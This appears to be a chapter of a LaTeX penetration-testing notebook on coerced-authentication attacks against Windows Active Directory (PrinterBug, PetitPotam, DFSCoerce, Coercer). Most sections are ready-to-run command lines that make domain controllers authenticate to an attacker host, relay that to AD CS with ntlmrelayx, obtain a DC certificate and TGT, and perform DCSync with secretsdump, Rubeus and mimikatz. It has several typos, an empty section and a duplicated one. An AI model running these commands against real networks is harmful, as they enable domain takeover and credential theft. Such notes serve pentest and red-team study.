\chapter{Coreced auths attacks}
\label{ad:auth-coercion}
\section{Introduction}

regardless of there being a plethora of them, almost all use the same sequence of operations:
\begin{enumerate}
    \item 
        Authenticate to a remote machine using valid domain credentials (usually over SMB).
    \item
        Connect to a remote SMB pipe such as \verb+\PIPE\netdfs+, \verb+\PIPE\efsrpc+, \verb+\PIPE\lsarpc+, or \verb+\PIPE\lsass+.
    \item
        Bind to an RPC protocol to call its methods on an arbitrary target machine.
\end{enumerate}


\subsection{DC coercion}

coercing a DC to authenticate allow the following attacks:
\begin{itemize}
    \item Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
    \item Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) (case of a DC) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
    \item Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
    \item Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.
\end{itemize}

\section{MS-RPRN PrinterBug}
\subsection{Introduction}

Print Spooler (aka “Spooler”) is a service that comes built-in in all Microsoft operating systems. It is enabled by default and runs within the SYSTEM context. This service manages the paper printing jobs.

The Print Spooler service (runs as SYSTEM and is installed by default in Windows servers running Desktop Experience.) accepts print jobs from the computer, makes sure that printer resources are available and schedules the order in which jobs are sent to the print queue for printing.

On domain controllers, the Print Spooler service is also responsible for printer pruning from Active Directory. This job checks if the print server is reachable and the printer is still shared, if not, deletes the printQueue object from AD.

The service implements the print client and print server roles, \href{https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/}{as can be seen in the diagram}.

For the print server role, the Print Spooler service registers RPC endpoints for the print protocols [MS-PAR] [MS-RPRN] [MS-PAN]. The Print Spooler service also exposes local interfaces that extend Internet Information Services (IIS) to support the Internet Printing Protocol (IPP) [RFC8010] [RFC8011] and the Web Point-and-Print Protocol [MS-WPRN] if they are configured to support IPP.


To exploit this vector, an unprivileged attacker in the network can remotely request a domain controller’s Print Spooler service to update an attacker-controlled host on new print jobs, by calling the \verb+RpcRemoteFindFirstPrinterChangeNotificationEx+ API (any domain user can connect to the spool's named pipe with the
\verb+RpcOpenPrinter+ method ).

The domain Controller would then authenticate to the attacker-controlled host, an act that can be abused to impersonate the domain Controller and compromise the domain in case of running on a system with unconstrained Kerberos Delegation. This vector can also be leveraged for some NTLM relay use cases, in case that the victim’s computer account has administrative access on other machines. {\bf Microsoft has classified this behavior as an intended one, by design, and do not plan on fixing it}.


The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with \href{https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications/webclient}{WebClient abuse} to elicit incoming authentications made over HTTP.


\subsection{Enum}




\begin{verbatim}
rpcdump.py $TARGET | grep -A 6 "spoolsv"
\end{verbatim}

Powershell \href{https://github.com/vletoux/SpoolerScanner}{SpoolerScanner}


\href{http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment}{Get-SpoolStatus}

\href{https://github.com/NotMedic/NetNTLMtoSilverTicket}{Get-SpoolStatus other version}

\begin{verbatim}
Get-ADComputer `
    -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * |
     select Name | ft -HideTableHeaders > servers.txt

. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
# Or
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
\end{verbatim}

\subsection{Exploit}

\begin{verbatim}
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' <attacker_ip>
\end{verbatim}

To coerce HTTP NTLM authentication on WebDAV-enabled hosts, we use the same syntax; however, for the listener, we will set it as a valid WebDAV connection string, using the format \verb+ATTACKER_MACHINE_NAME@PORT/PATH+

\begin{verbatim}
python3 printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET'  SUPPORTPC@80/print
\end{verbatim}

\begin{itemize}
    \item 
        \verb+ATTACKER_MACHINE_NAME+ must be the NetBIOS or DNS name of the attacker machine because Responder will poison broadcast traffic in any case, we set it to an arbitrary string.
    \item 
        \verb+PORT+ specifies an arbitrary port the WebDAV service will use to connect to the attack machine.
    \item 
        \verb+PATH+ specifies an arbitrary path the WebDAV service will attempt to connect.
\end{itemize}

\href{https://github.com/leechristensen/SpoolSample}{SpoolSample}





attack:
\begin{verbatim}
SpoolSample.exe <TARGET> <RESPONDERIP>

python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
\end{verbatim}

\subsection{links}

\begin{itemize}
    \item \href{https://www.sygnia.co/threat-reports-and-advisories/demystifying-the-print-nightmare-vulnerability/}{Demystifying The PrintNightmare Vulnerability}
    
\end{itemize}
\section{Print spooler}

Enumeration:
\begin{verbatim}
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt

. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
# Or
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
\end{verbatim}



attack:
\begin{verbatim}
SpoolSample.exe <TARGET> <RESPONDERIP>

python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
\end{verbatim}


\section{PetitPotam (MS-EFSRPC)}

\subsection{Intro}

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched
in August of 2021. The flaw allows an unauthenticated attacker to coerce a
Domain Controller to authenticate against another host using NTLM over port 445
via the
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc}{Local
Security Authority Remote Protocol (LSARPC)} by abusing Microsoft’s
\href{https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31}{Encrypting
File System Remote Protocol (MS-EFSRPC)}. This technique allows an
unauthenticated attacker to take over a Windows domain where
\href{https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs}{Active
Directory Certificate Services (AD CS)} is in use. 

In the attack, an authentication request from the targeted Domain Controller is
relayed to the Certificate Authority (CA) host's Web Enrollment page and makes
a Certificate Signing Request (CSR) for a new digital certificate. This
certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from
PKINITtools to request a TGT for the Domain Controller, which can then be used
to achieve domain compromise via a DCSync attack~\ref{kerberos:DCSync}.

\href{https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/}{This blog
post} goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

\subsection{Vuln check}

\begin{verbatim}
$ proxychains4 -q crackmapexec smb 172.16.10.3 -M PetitPotam
\end{verbatim}

\subsection{Exploit}
\begin{itemize}
    \item  start \verb+ntlmrelayx.py+ on the attack host, specifying the Web
        Enrollment URL for the CA host and using either the
        KerberosAuthentication or DomainController AD CS template (use 
        \href{https://github.com/zer1t0/certi}{certi} to find the URL of the
    CA):
\begin{verbatim}
sudo ntlmrelayx.py -debug -smb2support \
    --target http://CA_FQDN/certsrv/certfnsh.asp \
    --adcs --template DomainController
\end{verbatim}
    \item run \href{https://github.com/topotam/PetitPotam}{PotitPotam.py} to
        attempt to coerce the Domain Controller to authenticate to ths
        attacker:
\begin{verbatim}
python3 PetitPotam.py ATTACK_IP DC_IP
\end{verbatim}
    \item \verb+ntlmrelayx.py+ Catch the  Base64 Encoded Certificate for DC
    \item Requesting a TGT Using \verb+gettgtpkinit.py+:
\begin{verbatim}
python3 /opt/PKINITtools/gettgtpkinit.py DOMAIN.NAME/DC-NAME\$ \
    -pfx-base64 $BASE64_CERTIFICATE    dc.ccache
\end{verbatim}

    \item Setting the \verb+KRB5CCNAME+ Environment Variable:
\begin{verbatim}
export KRB5CCNAME=dc.ccache
\end{verbatim}

    \item Using Domain Controller TGT to DCSync with \verb+secretsdump.py+~\ref{tool:impacket:secretsdump:remote:NTDS}
    \item validate with \verb+klist+ from \verb+krb5-user+ package.
    \item Confirming Admin Access to the Domain Controller:
\begin{verbatim}
crackmapexec smb DC_IP -u administrator -H NT_HASH 
\end{verbatim}
\end{itemize}

\subsection{Using Rubeus}
After getting the TGT 
\begin{enumerate}
    \item use Reubus it is possible to use Reubus:
\begin{verbatim}
.\Rubeus.exe asktgt /user:DC_NAME$ /certificate BASE64_CERTIF /ptt
\end{verbatim}

    \item Confirming the Ticket is in Memory with \verb+klist+
    \item DCSync with mimikatz~\ref{tool:mimikatz:cred-dumping}
\end{enumerate}

\section{ShadowCoerce (MS-FSRVP)}

\section{DFSCoerce (MS-DFSNM)}

DFSCoerce abuses the NetrDfsAddStdRoot and NetrDfsRemoveStdRoot methods of Distributed File System (DFS): Namespace Management Protocol (MS-DFSNM).

A valid domain credentials is needed to use it 

DFSCoerce does not seem capable of coercing HTTP NTLM authentication.

\begin{verbatim}
python3 dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' <attacker_ip> <target_ip>
\end{verbatim}




\section{tools}
\subsection{coercer}
\begin{verbatim}
$ Coercer -u user -p password123 -d vuln.local -l srv.vuln.local -t dc.vuln.local
\end{verbatim}

\section{links}
\begin{itemize}
    \item 
        \href{https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications}{The
        Hacker Recipes :  MITM and coerced auths}
\end{itemize}
